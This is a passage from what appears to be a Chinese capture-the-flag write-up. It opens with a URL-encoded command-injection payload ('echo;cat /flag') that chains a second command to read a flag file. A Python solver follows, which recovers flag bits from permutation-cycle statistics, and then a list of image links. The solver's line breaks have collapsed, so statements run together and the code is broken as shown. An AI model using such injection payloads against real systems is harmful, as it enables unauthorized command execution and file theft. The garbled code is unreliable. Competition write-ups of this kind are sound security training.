4c%65%6e%67%74%68%3a%20%31%34%0a%0a%65%63%68%6f%3b%63%61%74%20%2f%66%6c%61%67%0a
```



```
from secret import flagfrom random import randrange, shufflefrom Crypto.Util.number import bytes_to_long, long_to_bytesfrom tqdm import tqdmimport ast
def instance(m, n):    start = list(range(m))    shuffle(start)    # print(start)    for i in range(m):        now = start[i]        this_turn = False        # print("i == " + str(i))        # print("now == " + str(now))        for j in range(n-1):            if now == i:                this_turn = True                break            now = start[now]            # print("start[now] == " + str(now))        if not this_turn:            return 0    return 1

def leak(m, n, times=2000):  message = [instance(m, n) for _ in range(times)]  return message
MAX_M = 400MIN_M = 200flag_b = [int(i) for i in bin(bytes_to_long(flag))[2:]]leak_message = []
# for bi in tqdm(flag_b):#     while True:#         tmp_m0 = randrange(MIN_M, MAX_M)#         tmp_n0 = randrange(int(tmp_m0//2), int(tmp_m0 * 8 // 9))#         tmp_m1 = randrange(MIN_M, MAX_M)#         tmp_n1 = randrange(int(tmp_m1//2), int(tmp_m1 * 8 // 9))#         if abs(tmp_m0-tmp_m1-tmp_n0+tmp_n1) > MAX_M // 5:#             break#     choose_m = tmp_m0 if bi == 0 else tmp_m1#     choose_n = tmp_n0 if bi == 0 else tmp_n1    # leak_message.append([[tmp_m0, tmp_n0], [tmp_m1, tmp_n1], leak(choose_m, choose_n)])
# open('data.txt', 'w').write(str(leak_message))flag_content = b''myflag_b = []leak_msg1 = []leak_msg2 = []# leak_message = def countNum(idx, leak_message):    num = 0    for i in range(len(leak_message[idx][2])):        if leak_message[idx][2][i] == 1:            num += 1    return num

def ret2bit(idx, leak_message):    mark = 0    list1 = leak_message[idx][0]    # print(list1)    list2 = leak_message[idx][1]    # print(list2)    normal_num = countNum(idx, leak_message)    print("normal_num == " + str(normal_num))    leak_msg1.append([list1, list2, leak(list1[0], list1[1])])    count_num = countNum(idx, leak_msg1)    print("count_num == " + str(count_num))    leak_msg2.append([list1, list2, leak(list2[0], list2[1])])    count_num2 = countNum(idx, leak_msg2)    print("count_num2 == " + str(count_num2))    if abs(normal_num - count_num) > abs(normal_num - count_num2):        return 1    return 0
# # 从文件中读取数据字符串with open('data.txt', 'r') as file:    data_str = file.read()
# 使用 ast 模块的 literal_eval 函数将字符串转换为列表对象leak_message = ast.literal_eval(data_str)# print(leak_message)
# for i in range(len(leak_message)):print(flag_b)myflag_b.insert(0, 0)for i in range(len(leak_message)):    myflag_b.append(ret2bit(i, leak_message))    print(myflag_b)    flag_int = int(''.join(map(str, myflag_b)), 2)    flag_bytes = long_to_bytes(flag_int)    print(flag_bytes)

# flag_b = [1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0]
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/1-1715562496.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/10-1715562496.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1715562497.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/5-1715562497.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/9-1715562498.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1715562498.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/9-1715562498.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/2-1715562499.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/10-1715562500.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/10-1715562500.png)